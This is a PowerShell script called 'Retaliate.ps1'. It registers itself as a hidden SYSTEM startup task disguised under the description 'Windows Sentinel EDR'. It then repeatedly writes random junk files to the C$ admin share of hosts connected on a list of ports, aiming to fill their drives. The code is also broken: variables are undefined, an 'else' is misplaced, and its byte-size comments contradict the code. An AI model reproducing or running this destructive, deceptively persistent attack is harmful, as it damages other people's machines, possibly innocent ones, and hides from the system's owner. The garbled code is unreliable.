# Retaliate.ps1
# Author: Gorstak

# Persistance
function Install-Startup {
    $scriptPath = $PSCommandPath
    $existing = Get-ScheduledTask -TaskName $Script:TaskName -ErrorAction SilentlyContinue
    if ($existing) {
        Log-Event -Type "system" -Rule "Persistence" -Evidence "Already installed as scheduled task" -Reasoning "Skipping" -Conf 1.0 -Tier "System" -PName "Retaliate" -PId $PID
        return
    }

    # Method 1: PowerShell cmdlets
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
            -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName $Script:TaskName -Action $action -Trigger $trigger `
            -Principal $principal -Settings $settings -Description "Windows Sentinel EDR" -Force -ErrorAction Stop | Out-Null
        Write-Host "  [OK] Installed startup task (PowerShell)" -ForegroundColor Green
        return
    } catch {
        Write-Host "  [WARN] PS task registration failed, trying schtasks..." -ForegroundColor Yellow
    }

    # Method 2: schtasks fallback
    try {
        $cmd = "schtasks /Create /TN `"$($Script:TaskName)`" /TR `"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \`"$scriptPath\`"`" /SC ONSTART /RU SYSTEM /RL HIGHEST /F"
        $null = cmd /c $cmd 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host "  [OK] Installed startup task (schtasks)" -ForegroundColor Green
        } else {
            Write-Host "  [WARN] All persistence methods failed" -ForegroundColor Yellow
        }
    } catch {}
}

$TargetPorts = @(
    21, 69, 111, 512, 513, 514, 548, 873, 2049,       # Legacy / File Transfer
    22, 23, 3389, 5900, 5985, 5986,                   # Remote Access
    135, 137, 138, 139, 445,                          # Windows Services
    1900, 2869, 5353, 5355,                           # Discovery
    389, 636,                                         # Directory / LDAP
    161, 162,                                         # SNMP
    1433, 1434, 1521, 3306, 5432, 6379, 9042, 9200,   # Databases
    11211, 27017,
    2375, 2376, 5000, 8291, 9090, 50070,              # Container / DevOps
    1099, 5601, 8888,                                 # Management / RCE
    1080,                                             # Proxies
    666, 1234, 1337, 4444, 5555, 6666, 6667, 7777,    # Known Malware / Backdoors
    12345, 31337, 54321
)


function Fill-RemoteHostDriveWithGarbage {
    try {
        # Get incoming TCP connections (where LocalAddress is bound and RemoteAddress is the client)
    foreach ($Port in $TargetPorts) {
        # Tražimo poklapanje na lokalnom ili udaljenom portu
        $IsConnected = $ActiveConnections | Where-Object { $_.LocalPort -eq $Port -or $_.RemotePort -eq $Port }
            foreach ($conn in $connections) {
                $remoteIP = $conn.RemoteAddress
                # Attempt to access the remote host's C$ share (admin share)
                $remotePath = "\\$remoteIP\C$"
                
                # Check if the remote path is accessible (requires admin rights)
                if (Test-Path $remotePath) {
                    $counter = 1
                    while ($true) {
                        try {
                            $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
                            $garbage = [byte[]]::new(1024) # 1MB in bytes
                            (New-Object System.Random).NextBytes($garbage)
                            [System.IO.File]::WriteAllBytes($filePath, $garbage)
                            Write-Host "Wrote 10MB to $filePath"
                            $counter++
                        }
                        catch {
                            # Stop if the drive is full or another error occurs
                            if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
                                Write-Host "Drive at $remotePath is full or inaccessible. Stopping."
                                break
                            }
                            else {
                                Write-Host "Error writing to $filePath : $_"
                                break
                            }
                        }
                    }
                }
                else {
                    Write-Host "Cannot access $remotePath - check permissions or connectivity."
                }
            }
        }
        else {
            Write-Host "No incoming connections found."
        }
    }
    catch {
        Write-Host "General error: $_"
    }
}

# Run as a background job
Start-Job -ScriptBlock {
    while ($true) {
        Fill-RemoteHostDriveWithGarbage
        Start-Sleep -Seconds 5 # Small delay to avoid overwhelming the system
    }
}